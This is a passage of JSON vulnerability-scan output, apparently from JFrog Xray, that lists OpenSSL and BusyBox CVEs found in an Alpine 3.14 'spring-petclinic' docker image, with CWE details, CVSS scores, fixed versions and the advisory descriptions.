            "vulnerability_id": "CVE-2024-0727",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-607990",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A read buffer overrun can be triggered in X.509 certificate verification,\nspecifically in name constraint checking. Note that this occurs\nafter certificate chain signature verification and requires either a\nCA to have signed the malicious certificate or for the application to\ncontinue certificate verification despite failure to construct a path\nto a trusted issuer.\n\nThe read buffer overrun might result in a crash which could lead to\na denial of service attack. In theory it could also result in the disclosure\nof private memory contents (such as private keys, or sensitive plaintext)\nalthough we are not aware of any working exploit leading to memory\ncontents disclosure as of the time of release of this advisory.\n\nIn a TLS client, this can be triggered by connecting to a malicious\nserver. In a TLS server, this can be triggered if the server requests\nclient authentication and a malicious client connects.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4203",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "4.9/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A read buffer overrun can be triggered in X.509 certificate verification,\nspecifically in name constraint checking. Note that this occurs\nafter certificate chain signature verification and requires either a\nCA to have signed the malicious certificate or for the application to\ncontinue certificate verification despite failure to construct a path\nto a trusted issuer.\n\nThe read buffer overrun might result in a crash which could lead to\na denial of service attack. In theory it could also result in the disclosure\nof private memory contents (such as private keys, or sensitive plaintext)\nalthough we are not aware of any working exploit leading to memory\ncontents disclosure as of the time of release of this advisory.\n\nIn a TLS client, this can be triggered by connecting to a malicious\nserver. In a TLS server, this can be triggered if the server requests\nclient authentication and a malicious client connects.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4203",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-607990",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A read buffer overrun can be triggered in X.509 certificate verification,\nspecifically in name constraint checking. Note that this occurs\nafter certificate chain signature verification and requires either a\nCA to have signed the malicious certificate or for the application to\ncontinue certificate verification despite failure to construct a path\nto a trusted issuer.\n\nThe read buffer overrun might result in a crash which could lead to\na denial of service attack. In theory it could also result in the disclosure\nof private memory contents (such as private keys, or sensitive plaintext)\nalthough we are not aware of any working exploit leading to memory\ncontents disclosure as of the time of release of this advisory.\n\nIn a TLS client, this can be triggered by connecting to a malicious\nserver. In a TLS server, this can be triggered if the server requests\nclient authentication and a malicious client connects.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4203",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "4.9/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A read buffer overrun can be triggered in X.509 certificate verification,\nspecifically in name constraint checking. Note that this occurs\nafter certificate chain signature verification and requires either a\nCA to have signed the malicious certificate or for the application to\ncontinue certificate verification despite failure to construct a path\nto a trusted issuer.\n\nThe read buffer overrun might result in a crash which could lead to\na denial of service attack. In theory it could also result in the disclosure\nof private memory contents (such as private keys, or sensitive plaintext)\nalthough we are not aware of any working exploit leading to memory\ncontents disclosure as of the time of release of this advisory.\n\nIn a TLS client, this can be triggered by connecting to a malicious\nserver. In a TLS server, this can be triggered if the server requests\nclient authentication and a malicious client connects.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4203",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-607948",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4304",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4304",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-607948",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-4304",
                     "cwe": [
                        "CWE-203"
                     ],
                     "cwe_details": {
                        "CWE-203": {
                           "name": "Observable Discrepancy",
                           "description": "The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not."
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A timing based side channel exists in the OpenSSL RSA Decryption implementation\nwhich could be sufficient to recover a plaintext across a network in a\nBleichenbacher style attack. To achieve a successful decryption an attacker\nwould have to be able to send a very large number of trial messages for\ndecryption. The vulnerability affects all RSA padding modes: PKCS#1 v1.5,\nRSA-OEAP and RSASVE.\n\nFor example, in a TLS connection, RSA is commonly used by a client to send an\nencrypted pre-master secret to the server. An attacker that had observed a\ngenuine connection between a client and a server could use this flaw to send\ntrial messages to the server and record the time taken to process them. After a\nsufficiently large number of messages the attacker could recover the pre-master\nsecret used for the original connection and thus be able to decrypt the\napplication data sent over that connection.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-4304",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-588120",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: The POLY1305 MAC (message authentication code) implementation\ncontains a bug that might corrupt the internal state of applications running\non PowerPC CPU based platforms if the CPU provides vector instructions.\n\nImpact summary: If an attacker can influence whether the POLY1305 MAC\nalgorithm is used, the application state might be corrupted with various\napplication dependent consequences.\n\nThe POLY1305 MAC (message authentication code) implementation in OpenSSL for\nPowerPC CPUs restores the contents of vector registers in a different order\nthan they are saved. Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm. The most common usage of this AEAD cipher is with TLS protocol\nversions 1.2 and 1.3. If this cipher is enabled on the server a malicious\nclient can influence whether this AEAD cipher is used. This implies that\nTLS server applications using OpenSSL can be potentially impacted. However\nwe are currently not aware of any concrete application that would be affected\nby this issue therefore we consider this a Low severity security issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.4-r3"
            ],
            "fixed_versions": [
               "3.1.4-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-6129",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H"
                  }
               ],
               "description": "Issue summary: The POLY1305 MAC (message authentication code) implementation\ncontains a bug that might corrupt the internal state of applications running\non PowerPC CPU based platforms if the CPU provides vector instructions.\n\nImpact summary: If an attacker can influence whether the POLY1305 MAC\nalgorithm is used, the application state might be corrupted with various\napplication dependent consequences.\n\nThe POLY1305 MAC (message authentication code) implementation in OpenSSL for\nPowerPC CPUs restores the contents of vector registers in a different order\nthan they are saved. Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm. The most common usage of this AEAD cipher is with TLS protocol\nversions 1.2 and 1.3. If this cipher is enabled on the server a malicious\nclient can influence whether this AEAD cipher is used. This implies that\nTLS server applications using OpenSSL can be potentially impacted. However\nwe are currently not aware of any concrete application that would be affected\nby this issue therefore we consider this a Low severity security issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-6129",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-588120",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: The POLY1305 MAC (message authentication code) implementation\ncontains a bug that might corrupt the internal state of applications running\non PowerPC CPU based platforms if the CPU provides vector instructions.\n\nImpact summary: If an attacker can influence whether the POLY1305 MAC\nalgorithm is used, the application state might be corrupted with various\napplication dependent consequences.\n\nThe POLY1305 MAC (message authentication code) implementation in OpenSSL for\nPowerPC CPUs restores the contents of vector registers in a different order\nthan they are saved. Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm. The most common usage of this AEAD cipher is with TLS protocol\nversions 1.2 and 1.3. If this cipher is enabled on the server a malicious\nclient can influence whether this AEAD cipher is used. This implies that\nTLS server applications using OpenSSL can be potentially impacted. However\nwe are currently not aware of any concrete application that would be affected\nby this issue therefore we consider this a Low severity security issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.4-r3"
            ],
            "fixed_versions": [
               "3.1.4-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-6129",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H"
                  }
               ],
               "description": "Issue summary: The POLY1305 MAC (message authentication code) implementation\ncontains a bug that might corrupt the internal state of applications running\non PowerPC CPU based platforms if the CPU provides vector instructions.\n\nImpact summary: If an attacker can influence whether the POLY1305 MAC\nalgorithm is used, the application state might be corrupted with various\napplication dependent consequences.\n\nThe POLY1305 MAC (message authentication code) implementation in OpenSSL for\nPowerPC CPUs restores the contents of vector registers in a different order\nthan they are saved. Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm. The most common usage of this AEAD cipher is with TLS protocol\nversions 1.2 and 1.3. If this cipher is enabled on the server a malicious\nclient can influence whether this AEAD cipher is used. This implies that\nTLS server applications using OpenSSL can be potentially impacted. However\nwe are currently not aware of any concrete application that would be affected\nby this issue therefore we consider this a Low severity security issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-6129",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-539896",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free vulnerability in BusyBox v.1.36.1 allows attackers to cause a denial of service via a crafted awk pattern in the awk.c evaluate function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.36.1-r30"
            ],
            "fixed_versions": [
               "1.36.1-r30"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42364",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A use-after-free vulnerability in BusyBox v.1.36.1 allows attackers to cause a denial of service via a crafted awk pattern in the awk.c evaluate function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-42364",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-539896",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free vulnerability in BusyBox v.1.36.1 allows attackers to cause a denial of service via a crafted awk pattern in the awk.c evaluate function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.36.1-r30"
            ],
            "fixed_versions": [
               "1.36.1-r30"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42364",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A use-after-free vulnerability in BusyBox v.1.36.1 allows attackers to cause a denial of service via a crafted awk pattern in the awk.c evaluate function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-42364",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-535159",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.4-r1"
            ],
            "fixed_versions": [
               "3.1.4-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5678",
                     "cwe": [
                        "CWE-754"
                     ],
                     "cwe_details": {
                        "CWE-754": {
                           "name": "Improper Check for Unusual or Exceptional Conditions",
                           "description": "The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-5678",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-535159",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.4-r1"
            ],
            "fixed_versions": [
               "3.1.4-r1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-5678",
                     "cwe": [
                        "CWE-754"
                     ],
                     "cwe_details": {
                        "CWE-754": {
                           "name": "Improper Check for Unusual or Exceptional Conditions",
                           "description": "The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Generating excessively long X9.42 DH keys or checking\nexcessively long X9.42 DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_generate_key() to\ngenerate an X9.42 DH key may experience long delays.  Likewise, applications\nthat use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check()\nto check an X9.42 DH key or X9.42 DH parameters may experience long delays.\nWhere the key or parameters that are being checked have been obtained from\nan untrusted source this may lead to a Denial of Service.\n\nWhile DH_check() performs all the necessary checks (as of CVE-2023-3817),\nDH_check_pub_key() doesn't make any of these checks, and is therefore\nvulnerable for excessively large P and Q parameters.\n\nLikewise, while DH_generate_key() performs a check for an excessively large\nP, it doesn't check for an excessively large Q.\n\nAn application that calls DH_generate_key() or DH_check_pub_key() and\nsupplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nDH_generate_key() and DH_check_pub_key() are also called by a number of\nother OpenSSL functions.  An application calling any of those other\nfunctions may similarly be affected.  The other functions affected by this\nare DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().\n\nAlso vulnerable are the OpenSSL pkey command line application when using the\n\"-pubcheck\" option, as well as the OpenSSL genpkey command line application.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-5678",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-526979",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
